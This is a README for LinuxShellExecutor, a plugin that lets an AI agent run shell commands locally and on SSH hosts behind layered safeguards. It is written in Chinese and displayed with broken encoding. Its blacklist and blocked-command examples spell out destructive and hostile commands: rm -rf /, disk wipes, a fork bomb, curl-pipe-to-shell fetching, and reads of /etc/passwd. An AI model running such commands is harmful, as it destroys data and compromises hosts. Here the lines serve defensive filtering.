# LinuxShellExecutor

å…­å±‚å®‰å…¨é˜²æŠ¤çš„ Linux Shell å‘½ä»¤æ‰§è¡Œå™¨ï¼Œä¸“ä¸º VCP Agent è®¾è®¡ã€‚

## ğŸ†• v0.4.0 æ–°åŠŸèƒ½

- âœ… **å››çº§å®‰å…¨åˆ†çº§** - readï¼ˆåªè¯»è‡ªåŠ¨æ”¾è¡Œï¼‰/ safeï¼ˆä½é£é™©è‡ªåŠ¨æ”¾è¡Œï¼‰/ writeï¼ˆéœ€éªŒè¯ï¼‰/ dangerï¼ˆäºŒæ¬¡ç¡®è®¤ï¼‰
- âœ… **æ™ºèƒ½ç®¡é“éªŒè¯** - åŸºäºå®‰å…¨çº§åˆ«çš„ç®¡é“é“¾éªŒè¯ï¼Œåªå…è®¸ readâ†’readã€readâ†’safeã€safeâ†’read çš„ç®¡é“ç»„åˆ
- âœ… **é¢„è®¾è¯Šæ–­å‘½ä»¤** - 12 ä¸ªé¢„è®¾å‘½ä»¤é›†ï¼ˆquickDiagã€checkServiceã€netDiagã€checkDiskã€checkDocker ç­‰ï¼‰
- âœ… **è¾“å‡ºæ ¼å¼åŒ–** - è‡ªåŠ¨æˆªæ–­ï¼ˆ100è¡Œï¼‰ã€è¡¨æ ¼ç¾åŒ–ã€æ”¯æŒ raw/formatted/json ä¸‰ç§è¾“å‡ºæ ¼å¼
- âœ… **å‚æ•°åŒ–é¢„è®¾** - æ”¯æŒ `preset:checkService?serviceName=nginx` æ ¼å¼çš„å‚æ•°åŒ–è°ƒç”¨

## ğŸ“‹ v0.3.x åŠŸèƒ½

- âœ… **ä¸‰çº§æƒé™æ§åˆ¶** - ç™½åå•ï¼ˆå…éªŒè¯ï¼‰/ ç°åå•ï¼ˆéœ€éªŒè¯ï¼‰/ é»‘åå•ï¼ˆç¦æ­¢ï¼‰
- âœ… **èµ„æºé™åˆ¶ (rlimit)** - æ”¯æŒ CPUã€å†…å­˜ã€æ–‡ä»¶å¤§å°ã€è¿›ç¨‹æ•°ç­‰èµ„æºé™åˆ¶
- âœ… **ç®¡é“å‘½ä»¤éªŒè¯** - æ”¯æŒç®¡é“å‘½ä»¤çš„å®‰å…¨éªŒè¯ï¼Œé™åˆ¶ç®¡é“æ·±åº¦å’Œå…è®¸çš„å‘½ä»¤
- âœ… **SSH è¿æ¥æ± ä¼˜åŒ–** - è¿æ¥æ•°é‡é™åˆ¶ã€è‡ªåŠ¨é‡è¯•ã€è¿æ¥æ± å¤§å°ç®¡ç†

## ğŸ“‹ v0.2.0 åŠŸèƒ½

- âœ… **å¤šä¸»æœº SSH è¿œç¨‹æ‰§è¡Œ** - æ”¯æŒé…ç½®å¤šå° Linux æœåŠ¡å™¨
- âœ… **å¯†é’¥/å¯†ç è®¤è¯** - æ”¯æŒ SSH ç§é’¥å’Œå¯†ç ä¸¤ç§è®¤è¯æ–¹å¼
- âœ… **è·³æ¿æœºæ”¯æŒ** - æ”¯æŒé€šè¿‡è·³æ¿æœºè®¿é—®å†…ç½‘æœåŠ¡å™¨
- âœ… **è¿æ¥æ± ç®¡ç†** - è‡ªåŠ¨ç®¡ç† SSH è¿æ¥ï¼Œæ”¯æŒä¼šè¯å¤ç”¨

## æ¶æ„æ¦‚è§ˆ

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    LinuxShellExecutor v0.4.0                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                   ä¸»æœºç®¡ç†å™¨                         â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”             â”‚   â”‚
â”‚  â”‚  â”‚ local   â”‚  â”‚dev-serverâ”‚ â”‚prod-srv â”‚  ...        â”‚   â”‚
â”‚  â”‚  â”‚ æœ¬åœ°    â”‚  â”‚ SSH Key â”‚  â”‚ SSH Key â”‚             â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                          â†“                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚              ä¸‰çº§æƒé™æ§åˆ¶                            â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”             â”‚   â”‚
â”‚  â”‚  â”‚ é»‘åå•  â”‚â†’â”‚ ç™½åå•  â”‚â†’â”‚ ç°åå•  â”‚             â”‚   â”‚
â”‚  â”‚  â”‚ ç¦æ­¢    â”‚  â”‚ å…éªŒè¯  â”‚  â”‚ éœ€éªŒè¯  â”‚             â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                          â†“                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚              å…­å±‚å®‰å…¨é˜²æŠ¤                            â”‚   â”‚
â”‚  â”‚  1.é»‘åå• â†’ 2.ç™½åå• â†’ 3.ç°åå• â†’ 4.AST â†’ 5.æ²™ç®± â†’ 6.å®¡è®¡â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## å®‰è£…ä¾èµ–

```bash
cd Plugin/LinuxShellExecutor
npm install ssh2 dotenv
```

## ç³»ç»Ÿä¾èµ–ï¼ˆæœ¬åœ°æ²™ç®±æ‰§è¡Œï¼‰

```bash
# Bubblewrapï¼ˆæ¨èï¼Œæœ€è½»é‡ï¼‰
apt install bubblewrap

# æˆ– Firejail
apt install firejail

# æˆ– Docker
apt install docker.io
```

## é…ç½®è¯´æ˜

### 1. ä¸»æœºé…ç½® (hosts.json)

```json
{
    "hosts": {
        "local": {
            "name": "æœ¬åœ°æ‰§è¡Œ",
            "type": "local",
            "enabled": true,
            "securityLevel": "standard"
        },
        "dev-server": {
            "name": "å¼€å‘æœåŠ¡å™¨",
            "type": "ssh",
            "enabled": true,
            "host": "192.168.1.100",
            "port": 22,
            "username": "developer",
            "authMethod": "key",
            "privateKeyPath": "~/.ssh/id_rsa",
            "securityLevel": "standard"
        },
        "prod-server": {
            "name": "ç”Ÿäº§æœåŠ¡å™¨",
            "type": "ssh",
            "enabled": true,
            "host": "10.0.0.10",
            "port": 22,
            "username": "ops",
            "authMethod": "key",
            "privateKeyPath": "/path/to/prod_key",
            "securityLevel": "high",
            "jumpHost": "bastion"
        }
    },
    "defaultHost": "local",
    "globalSettings": {
        "maxConcurrentConnections": 5,
        "connectionPoolSize": 10,
        "defaultTimeout": 30000,
        "retryAttempts": 3,
        "retryDelay": 1000,
        "logConnections": true
    }
}
```

### hosts.json å­—æ®µè¯´æ˜

#### ä¸»æœºé…ç½®å­—æ®µ (hosts.{hostId})

| å­—æ®µ | ç±»å‹ | å¿…éœ€ | é»˜è®¤å€¼ | è¯´æ˜ |
|------|------|------|--------|------|
| `name` | string | âœ“ | - | ä¸»æœºæ˜¾ç¤ºåç§° |
| `description` | string | | - | ä¸»æœºæè¿°ä¿¡æ¯ |
| `type` | string | âœ“ | - | ä¸»æœºç±»å‹ï¼š`local`ï¼ˆæœ¬åœ°ï¼‰æˆ– `ssh`ï¼ˆè¿œç¨‹ï¼‰ |
| `enabled` | boolean | âœ“ | - | æ˜¯å¦å¯ç”¨è¯¥ä¸»æœº |
| `host` | string | SSHå¿…éœ€ | - | SSH ä¸»æœºåœ°å€ï¼ˆIP æˆ–åŸŸåï¼‰ |
| `port` | number | | 22 | SSH ç«¯å£å· |
| `username` | string | SSHå¿…éœ€ | - | SSH ç™»å½•ç”¨æˆ·å |
| `authMethod` | string | SSHå¿…éœ€ | - | è®¤è¯æ–¹å¼ï¼š`key`ï¼ˆå¯†é’¥ï¼‰æˆ– `password`ï¼ˆå¯†ç ï¼‰ |
| `privateKeyPath` | string | å¯†é’¥è®¤è¯å¿…éœ€ | - | SSH ç§é’¥æ–‡ä»¶è·¯å¾„ï¼Œæ”¯æŒ `~` å±•å¼€ |
| `passphrase` | string | | "" | ç§é’¥å¯†ç çŸ­è¯­ï¼ˆå¦‚æœç§é’¥æœ‰å¯†ç ä¿æŠ¤ï¼‰ |
| `password` | string | å¯†ç è®¤è¯å¿…éœ€ | - | SSH ç™»å½•å¯†ç ï¼ˆä¸æ¨èä½¿ç”¨ï¼‰ |
| `securityLevel` | string | | "standard" | å®‰å…¨ç­‰çº§ï¼š`basic`/`standard`/`high`/`maximum` |
| `timeout` | number | | 30000 | è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ |
| `keepAliveInterval` | number | | 10000 | å¿ƒè·³ä¿æ´»é—´éš”ï¼ˆæ¯«ç§’ï¼‰ |
| `jumpHost` | string | | null | è·³æ¿æœºä¸»æœºIDï¼ˆç”¨äºè®¿é—®å†…ç½‘æœåŠ¡å™¨ï¼‰ |
| `tags` | array | | [] | ä¸»æœºæ ‡ç­¾ï¼Œç”¨äºåˆ†ç±»å’Œç­›é€‰ |

#### å…¨å±€é…ç½®å­—æ®µ (globalSettings)

| å­—æ®µ | ç±»å‹ | é»˜è®¤å€¼ | è¯´æ˜ |
|------|------|--------|------|
| `maxConcurrentConnections` | number | 5 | æœ€å¤§å¹¶å‘è¿æ¥æ•° |
| `connectionPoolSize` | number | 10 | è¿æ¥æ± å¤§å° |
| `defaultTimeout` | number | 30000 | é»˜è®¤è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ |
| `retryAttempts` | number | 3 | è¿æ¥å¤±è´¥é‡è¯•æ¬¡æ•° |
| `retryDelay` | number | 1000 | é‡è¯•é—´éš”ï¼ˆæ¯«ç§’ï¼‰ |
| `logConnections` | boolean | true | æ˜¯å¦è®°å½•è¿æ¥æ—¥å¿— |

#### é¡¶å±‚é…ç½®å­—æ®µ

| å­—æ®µ | ç±»å‹ | è¯´æ˜ |
|------|------|------|
| `version` | string | é…ç½®æ–‡ä»¶ç‰ˆæœ¬å· |
| `description` | string | é…ç½®æ–‡ä»¶æè¿° |
| `hosts` | object | ä¸»æœºé…ç½®å¯¹è±¡ï¼Œkey ä¸ºä¸»æœºID |
| `defaultHost` | string | é»˜è®¤ä¸»æœºIDï¼ŒæœªæŒ‡å®š hostId æ—¶ä½¿ç”¨ |
| `globalSettings` | object | å…¨å±€è®¾ç½® |

### 2. è®¤è¯æ–¹å¼

#### SSH å¯†é’¥è®¤è¯ï¼ˆæ¨èï¼‰

```json
{
    "authMethod": "key",
    "privateKeyPath": "~/.ssh/id_rsa",
    "passphrase": ""
}
```

#### å¯†ç è®¤è¯ï¼ˆä¸æ¨èï¼‰

```json
{
    "authMethod": "password",
    "password": "your-password"
}
```

### 3. è·³æ¿æœºé…ç½®

```json
{
    "bastion": {
        "name": "è·³æ¿æœº",
        "type": "ssh",
        "host": "bastion.example.com",
        "username": "jump",
        "authMethod": "key",
        "privateKeyPath": "~/.ssh/bastion_key"
    },
    "internal-server": {
        "name": "å†…ç½‘æœåŠ¡å™¨",
        "type": "ssh",
        "host": "192.168.100.50",
        "username": "admin",
        "authMethod": "key",
        "privateKeyPath": "~/.ssh/internal_key",
        "jumpHost": "bastion"
    }
}
```

## è°ƒç”¨æ–¹å¼

### åŸºæœ¬å‘½ä»¤æ‰§è¡Œ

```
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
command:ã€Œå§‹ã€ls -la /tmpã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>
```

### æŒ‡å®šè¿œç¨‹ä¸»æœº

```
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
command:ã€Œå§‹ã€df -hã€Œæœ«ã€,
hostId:ã€Œå§‹ã€dev-serverã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>
```

### åˆ—å‡ºæ‰€æœ‰ä¸»æœº

```
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
action:ã€Œå§‹ã€listHostsã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>
```

### æµ‹è¯•ä¸»æœºè¿æ¥

```
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
action:ã€Œå§‹ã€testConnectionã€Œæœ«ã€,
hostId:ã€Œå§‹ã€dev-serverã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>
```

### è·å–è¿æ¥çŠ¶æ€

```
<<<[TOOL_REQUEST]>>>
tool_name:ã€Œå§‹ã€LinuxShellExecutorã€Œæœ«ã€,
action:ã€Œå§‹ã€getStatusã€Œæœ«ã€
<<<[END_TOOL_REQUEST]>>>
```

## å‚æ•°è¯´æ˜

| å‚æ•° | ç±»å‹ | å¿…éœ€ | è¯´æ˜ |
|------|------|------|------|
| `command` | string | âœ“* | è¦æ‰§è¡Œçš„ Shell å‘½ä»¤ï¼Œæˆ– `preset:é¢„è®¾å?å‚æ•°` æ ¼å¼ |
| `action` | string | âœ“* | ç‰¹æ®Šæ“ä½œï¼šlistHosts/testConnection/getStatus/listPresets |
| `hostId` | string | | ç›®æ ‡ä¸»æœºIDï¼Œé»˜è®¤ 'local' |
| `timeout` | number | | è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ï¼Œé»˜è®¤ 30000 |
| `securityLevel` | string | | å®‰å…¨ç­‰çº§ï¼šbasic/standard/high/maximum |
| `outputFormat` | string | | è¾“å‡ºæ ¼å¼ï¼šraw/formatted/jsonï¼Œé»˜è®¤ 'formatted' |
| `requireAdmin` | string | æ¡ä»¶å¿…éœ€ | ç®¡ç†å‘˜éªŒè¯ç ï¼Œwrite/danger çº§åˆ«å‘½ä»¤å¿…éœ€ |
| `doubleConfirm` | boolean | æ¡ä»¶å¿…éœ€ | danger çº§åˆ«å‘½ä»¤éœ€è¦è®¾ä¸º true |

*æ³¨ï¼šcommand å’Œ action äºŒé€‰ä¸€

## è¿”å›æ ¼å¼

### å‘½ä»¤æ‰§è¡ŒæˆåŠŸ

```json
{
    "status": "success",
    "result": "å‘½ä»¤è¾“å‡ºå†…å®¹",
    "stderr": "é”™è¯¯è¾“å‡ºï¼ˆå¦‚æœ‰ï¼‰",
    "code": 0,
    "duration": 123,
    "hostId": "dev-server",
    "securityLevel": "standard",
    "executionType": "ssh"
}
```

### åˆ—å‡ºä¸»æœº

```json
{
    "status": "success",
    "hosts": [
        {
            "id": "local",
            "name": "æœ¬åœ°æ‰§è¡Œ",
            "type": "local",
            "enabled": true
        },
        {
            "id": "dev-server",
            "name": "å¼€å‘æœåŠ¡å™¨",
            "type": "ssh",
            "enabled": true,
            "host": "192.168.1.100"
        }
    ]
}
```

### è¿æ¥æµ‹è¯•

```json
{
    "status": "success",
    "success": true,
    "hostId": "dev-server",
    "latency": 45,
    "message": "è¿æ¥æˆåŠŸï¼Œå»¶è¿Ÿ 45ms"
}
```

## å®‰å…¨ç­‰çº§

| ç­‰çº§ | å¯ç”¨å±‚ | é€‚ç”¨åœºæ™¯ |
|------|--------|----------|
| `basic` | é»‘åå• | å†…éƒ¨å¯ä¿¡ç¯å¢ƒ |
| `standard` | é»‘åå• + ç™½åå•/ç°åå• + æ²™ç®± | ä¸€èˆ¬ç”Ÿäº§ç¯å¢ƒï¼ˆé»˜è®¤ï¼‰ |
| `high` | é»‘åå• + ç™½åå•/ç°åå• + AST + æ²™ç®± | æ•æ„Ÿæ•°æ®ç¯å¢ƒ |
| `maximum` | å…¨éƒ¨å…­å±‚ | å…¬å¼€ API / å¤šç§Ÿæˆ· |

## ç™½åå•å‘½ä»¤åˆ—è¡¨ï¼ˆæ— éœ€éªŒè¯ï¼‰

| å‘½ä»¤ | è¯´æ˜ | å…è®¸çš„å‚æ•° |
|------|------|-----------|
| `ls` | åˆ—å‡ºç›®å½• | -l, -a, -la, -lh, -R, -t, -S |
| `cat` | æŸ¥çœ‹æ–‡ä»¶ | -n, -b, -s |
| `grep` | æ–‡æœ¬æœç´¢ | -i, -n, -r, -v, -c, -l, -E, -w |
| `find` | æŸ¥æ‰¾æ–‡ä»¶ | -name, -type, -size, -mtime, -maxdepth |
| `ps` | æŸ¥çœ‹è¿›ç¨‹ | aux, -ef, -u, --forest |
| `df` | ç£ç›˜ä½¿ç”¨ | -h, -T, -i |
| `free` | å†…å­˜ä½¿ç”¨ | -m, -h, -g |
| `head` | æ–‡ä»¶å¤´éƒ¨ | -n, -c |
| `tail` | æ–‡ä»¶å°¾éƒ¨ | -n, -f, -c |
| `wc` | ç»Ÿè®¡ | -l, -w, -c, -m |
| `echo` | è¾“å‡ºæ–‡æœ¬ | -n, -e |
| `pwd` | å½“å‰ç›®å½• | - |
| `whoami` | å½“å‰ç”¨æˆ· | - |
| `date` | æ—¥æœŸæ—¶é—´ | +%Y-%m-%d, +%H:%M:%S |
| `uname` | ç³»ç»Ÿä¿¡æ¯ | -a, -r, -m, -n |
| `hostname` | ä¸»æœºå | -f, -i |
| `uptime` | è¿è¡Œæ—¶é—´ | -p, -s |
| `id` | ç”¨æˆ·ID | -u, -g, -n |
| `env` | ç¯å¢ƒå˜é‡ | - |
| `which` | å‘½ä»¤è·¯å¾„ | -a |
| `file` | æ–‡ä»¶ç±»å‹ | -b, -i |
| `stat` | æ–‡ä»¶çŠ¶æ€ | -c |
| `du` | ç›®å½•å¤§å° | -h, -s, -a, -c |
| `sort` | æ’åº | -n, -r, -u, -k, -t |
| `uniq` | å»é‡ | -c, -d, -u |
| `cut` | å­—æ®µåˆ‡å‰² | -d, -f, -c |
| `awk` | æ–‡æœ¬å¤„ç† | -F |
| `sed` | æµç¼–è¾‘å™¨ | -n, -e |

## ç°åå•å‘½ä»¤åˆ—è¡¨ï¼ˆéœ€è¦éªŒè¯ï¼‰

### ç³»ç»ŸçŠ¶æ€ç›‘æ§

| å‘½ä»¤ | è¯´æ˜ | é£é™©çº§åˆ« |
|------|------|----------|
| `uptime` | ç³»ç»Ÿè¿è¡Œæ—¶é—´ | ğŸŸ¢ ä½ |
| `free` | å†…å­˜ä½¿ç”¨æƒ…å†µï¼ˆæ‰©å±•å‚æ•°ï¼‰ | ğŸŸ¢ ä½ |
| `top` | ç³»ç»Ÿç›‘æ§ï¼ˆæ‰©å±•è¿­ä»£ï¼‰ | ğŸŸ¢ ä½ |
| `htop` | äº¤äº’å¼è¿›ç¨‹ç›‘æ§ | ğŸŸ¡ ä¸­ |
| `vmstat` | è™šæ‹Ÿå†…å­˜ç»Ÿè®¡ï¼ˆæ‰©å±•ï¼‰ | ğŸŸ¢ ä½ |
| `iostat` | IO ç»Ÿè®¡ï¼ˆæ‰©å±•ï¼‰ | ğŸŸ¢ ä½ |

### ç½‘ç»œè¯Šæ–­

| å‘½ä»¤ | è¯´æ˜ | é£é™©çº§åˆ« |
|------|------|----------|
| `ip` | ç½‘ç»œé…ç½®æŸ¥çœ‹ | ğŸŸ¢ ä½ |
| `ss` | Socket ç»Ÿè®¡ï¼ˆæ‰©å±•ï¼‰ | ğŸŸ¢ ä½ |
| `ping` | ç½‘ç»œè¿é€šæ€§æµ‹è¯•ï¼ˆæ‰©å±•ï¼‰ | ğŸŸ¢ ä½ |
| `traceroute` | è·¯ç”±è¿½è¸ª | ğŸŸ¢ ä½ |
| `mtr` | ç½‘ç»œè¯Šæ–­ | ğŸŸ¢ ä½ |
| `curl` | HTTP è¯·æ±‚ï¼ˆå®Œæ•´åŠŸèƒ½ï¼‰ | ğŸŸ¡ ä¸­ |
| `wget` | HTTP ä¸‹è½½ | ğŸŸ¡ ä¸­ |
| `nc/netcat` | ç½‘ç»œè°ƒè¯•å·¥å…· | ğŸŸ¡ ä¸­ |
| `tcpdump` | ç½‘ç»œæŠ“åŒ… | ğŸ”´ é«˜ |

### è¿›ç¨‹ç®¡ç†

| å‘½ä»¤ | è¯´æ˜ | é£é™©çº§åˆ« |
|------|------|----------|
| `pgrep` | æŒ‰åç§°æŸ¥æ‰¾è¿›ç¨‹ | ğŸŸ¢ ä½ |
| `lsof` | åˆ—å‡ºæ‰“å¼€çš„æ–‡ä»¶/ç«¯å£ | ğŸŸ¢ ä½ |
| `kill` | ç»ˆæ­¢è¿›ç¨‹ | ğŸ”´ é«˜ |
| `killall` | æŒ‰åç§°ç»ˆæ­¢è¿›ç¨‹ | ğŸ”´ é«˜ |
| `pkill` | æŒ‰æ¨¡å¼ç»ˆæ­¢è¿›ç¨‹ | ğŸ”´ é«˜ |

### æ—¥å¿—æŸ¥çœ‹

| å‘½ä»¤ | è¯´æ˜ | é£é™©çº§åˆ« |
|------|------|----------|
| `tail` | å®æ—¶æ—¥å¿—è¿½è¸ªï¼ˆ-f æ¨¡å¼ï¼‰ | ğŸŸ¡ ä¸­ |
| `journalctl` | ç³»ç»Ÿæ—¥å¿—æŸ¥è¯¢ï¼ˆæ‰©å±•ï¼‰ | ğŸŸ¡ ä¸­ |
| `dmesg` | å†…æ ¸æ—¥å¿—ï¼ˆæ‰©å±•ï¼‰ | ğŸŸ¡ ä¸­ |

### æœåŠ¡ç®¡ç†

| å‘½ä»¤ | è¯´æ˜ | é£é™©çº§åˆ« |
|------|------|----------|
| `systemctl` | æœåŠ¡ç®¡ç†ï¼ˆå®Œæ•´æ§åˆ¶ï¼‰ | ğŸ”´ é«˜ |
| `service` | æœåŠ¡ç®¡ç†ï¼ˆä¼ ç»Ÿå‘½ä»¤ï¼‰ | ğŸ”´ é«˜ |

### Docker å®¹å™¨

| å‘½ä»¤ | è¯´æ˜ | é£é™©çº§åˆ« |
|------|------|----------|
| `docker` | Docker å®Œæ•´ç®¡ç† | ğŸ”´ é«˜ |
| `docker-compose` | Docker Compose ç®¡ç† | ğŸ”´ é«˜ |

### æ•°æ®åº“ç®¡ç†

| å‘½ä»¤ | è¯´æ˜ | é£é™©çº§åˆ« |
|------|------|----------|
| `mysql` | MySQL ç®¡ç†ï¼ˆæ‰©å±•ï¼‰ | ğŸ”´ é«˜ |
| `mysqladmin` | MySQL ç®¡ç†å·¥å…· | ğŸŸ¡ ä¸­ |
| `redis-cli` | Redis ç®¡ç†ï¼ˆæ‰©å±•ï¼‰ | ğŸ”´ é«˜ |
| `psql` | PostgreSQL å®¢æˆ·ç«¯ | ğŸ”´ é«˜ |
| `mongo` | MongoDB å®¢æˆ·ç«¯ | ğŸ”´ é«˜ |

### ç³»ç»Ÿæ§åˆ¶

| å‘½ä»¤ | è¯´æ˜ | é£é™©çº§åˆ« |
|------|------|----------|
| `nginx` | Nginx ç®¡ç† | ğŸ”´ é«˜ |
| `apachectl` | Apache ç®¡ç† | ğŸ”´ é«˜ |
| `crontab` | å®šæ—¶ä»»åŠ¡æŸ¥çœ‹ | ğŸŸ¡ ä¸­ |
| `timedatectl` | æ—¶é—´æ—¥æœŸç®¡ç† | ğŸŸ¡ ä¸­ |
| `reboot` | é‡å¯ç³»ç»Ÿ | âš« æé«˜ |
| `shutdown` | å…³æœº/é‡å¯ | âš« æé«˜ |

## é»‘åå•å‘½ä»¤åˆ—è¡¨ï¼ˆå®Œå…¨ç¦æ­¢ï¼‰

é»‘åå•é…ç½®åœ¨ `config.env` æ–‡ä»¶ä¸­ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼š

### ç¦æ­¢æ¨¡å¼ï¼ˆæ­£åˆ™åŒ¹é…ï¼‰

| æ¨¡å¼ | è¯´æ˜ | å±é™©ç­‰çº§ |
|------|------|----------|
| `rm -rf /` | åˆ é™¤æ ¹ç›®å½• | âš« è‡´å‘½ |
| `rm -rf /*` | åˆ é™¤æ ¹ç›®å½•æ‰€æœ‰å†…å®¹ | âš« è‡´å‘½ |
| `mkfs.*` | æ ¼å¼åŒ–æ–‡ä»¶ç³»ç»Ÿ | âš« è‡´å‘½ |
| `dd if=` | ç£ç›˜é•œåƒå†™å…¥ | âš« è‡´å‘½ |
| `:(){ :\|:& };:` | Fork ç‚¸å¼¹ | âš« è‡´å‘½ |
| `chmod 777 /` | ä¿®æ”¹æ ¹ç›®å½•æƒé™ | ğŸ”´ é«˜å± |
| `chmod -R 777` | é€’å½’ä¿®æ”¹æƒé™ | ğŸ”´ é«˜å± |
| `> /dev/sd*` | å†™å…¥ç£ç›˜è®¾å¤‡ | âš« è‡´å‘½ |
| `cat /dev/zero > /dev/sd*` | æ¸…ç©ºç£ç›˜ | âš« è‡´å‘½ |
| `wget ... \| sh` | è¿œç¨‹è„šæœ¬æ‰§è¡Œ | ğŸ”´ é«˜å± |
| `curl ... \| sh` | è¿œç¨‹è„šæœ¬æ‰§è¡Œ | ğŸ”´ é«˜å± |

### ç¦æ­¢å‘½ä»¤ï¼ˆç²¾ç¡®åŒ¹é…ï¼‰

| å‘½ä»¤ | è¯´æ˜ | å±é™©ç­‰çº§ |
|------|------|----------|
| `poweroff` | å…³æœº | ğŸ”´ é«˜å± |
| `halt` | åœæœº | ğŸ”´ é«˜å± |
| `init 0` | å…³æœº | ğŸ”´ é«˜å± |
| `init 6` | é‡å¯ | ğŸ”´ é«˜å± |
| `reboot -f` | å¼ºåˆ¶é‡å¯ | ğŸ”´ é«˜å± |
| `shutdown` | å…³æœº/é‡å¯ | ğŸ”´ é«˜å± |

> **æ³¨æ„**: é»‘åå•å‘½ä»¤æ— è®ºæ˜¯å¦æä¾›éªŒè¯ç éƒ½ä¼šè¢«æ‹’ç»æ‰§è¡Œã€‚

## å®‰å…¨æ£€æµ‹ç¤ºä¾‹

### è¢«æ‹¦æˆªçš„å±é™©å‘½ä»¤

```bash
# é»‘åå•æ‹¦æˆª
rm -rf /                    # âŒ åŒ¹é…ç¦æ­¢æ¨¡å¼
poweroff                    # âŒ ç²¾ç¡®åŒ¹é…ç¦æ­¢å‘½ä»¤

# ç™½åå•æ‹¦æˆª
apt install vim             # âŒ apt ä¸åœ¨ç™½åå•
ls /etc/shadow              # âŒ è·¯å¾„åœ¨æ‹’ç»åˆ—è¡¨

# AST åˆ†ææ‹¦æˆª
echo $(cat /etc/passwd)     # âŒ å‘½ä»¤æ³¨å…¥
curl http://x.com | sh      # âŒ ç½‘ç»œå¤–æ³„
sudo ls                     # âŒ ææƒå°è¯•
```

### å…è®¸æ‰§è¡Œçš„å®‰å…¨å‘½ä»¤

```bash
ls -la /tmp                 # âœ“
cat /var/log/syslog         # âœ“
